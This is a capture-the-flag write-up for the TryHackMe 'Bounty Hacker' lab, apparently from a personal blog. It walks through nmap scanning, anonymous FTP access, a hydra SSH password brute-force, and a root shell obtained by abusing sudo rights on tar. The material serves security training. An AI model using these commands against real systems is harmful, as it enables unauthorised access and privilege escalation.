## Bounty Hacker Writeup
[Other THM Writeups](../../../)

**Author** : [Ridful](../../../../)

**THM** : [Ridful](https://tryhackme.com/p/Ridful)

**Twitter** : [Ridful5](https://twitter.com/Ridful5)

# [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)


## Task 1

Run a Nmap scan

sudo nmap -sS -sV 10.10.147.231
```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 22:15 EST
Nmap scan report for 10.10.147.231
Host is up (0.29s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's check the website first at: http:// 10.10.147.231/

There's some potential usernames here we can note down.

touch usernames.txt

Enter all of the usernames mentioned on http:// 10.10.147.231/ into usernames.txt

Let's move on to ftp and check if we've got an anonymous login open.

ftp anonymous@10.10.147.231
```
Connected to 10.10.147.231.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

We do! Let's go ahead and grab any files available

passive
```
Passive mode: off; fallback to active mode: off.
```

ls -la
```
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

Download the two textfiles files our current working directory outside of ftp

mget *
```
ftp> mget *
mget locks.txt [anpqy?]? y
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*********************************************************|   418      495.39 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (1.44 KiB/s)
mget task.txt [anpqy?]? y
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*********************************************************|    68      180.45 KiB/s    00:00 ETA
226 Transfer complete.
```

Alternatively we can do **get locks.txt** and **get task.txt**.

then **exit** out of ftp.

ls
```
task.txt  locks.txt  usernames.txt
```

cat task.txt
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

lin is a potential username we haven't seen before, let's add lin to usernames.txt

**ADD lin** to **usernames.txt**

**ADD lin** to **usernames.txt**

echo "lin" >> usernames.txt

cat locks.txt
```
[...]
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
[...]
```

Let's get hydra running what seemed like a password list against all of the potential usernames we found

hydra ssh://10.10.147.231 -L usernames.txt -P locks.txt -t 6
```
[...]
[DATA] attacking ssh://10.10.147.231:22/
[22][ssh] host: 10.10.147.231   login:  lin   password: xxxxxxxxxxxxxx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-18 22:23:53
```

ls
```
user.txt
```

cat user.txt
```
THM{xxxxxxxxxxxxx}
```

id
```
uid=1001(lin) gid=1001(lin) groups=1001(lin)
```

sudo -l
```
User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Cool, we've got the ability to run tar as root, let's check gtfobins if there's anything useful we can do with the tar binary.

https://gtfobins.github.io/gtfobins/tar/

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
tar: Removing leading `/' from member names
#
```

id
```
uid=0(root) gid=0(root) groups=0(root)
```

sudo -l
```
[...]
User root may run the following commands on bountyhacker:
    (ALL : ALL) ALL
```

find / -type f -name root.txt
```
/root/root.txt
```

cat /root/root.txt
```
THM{xxxxxxxxxxxxx}
```


# Reflection

This was a fun room, I enjoyed it, and definitely positively benefited from it.

I did make a blunder in the sense that I didn't check "sudo -l" until pretty late on..
Ideally I would've checked it as soon as I had successfully connected through with SSH.

To me, this highlights the importance of a rudimental "checklist" of what things are very preferable to remember doing at the very early steps.

Had I been using a checklist for myself, I presumably wouldn't have wasted a good chunk of time by moving on to unfamiliar territories prematurely,
before making fully sure that the all the simpler stuff has all been successfully performed.
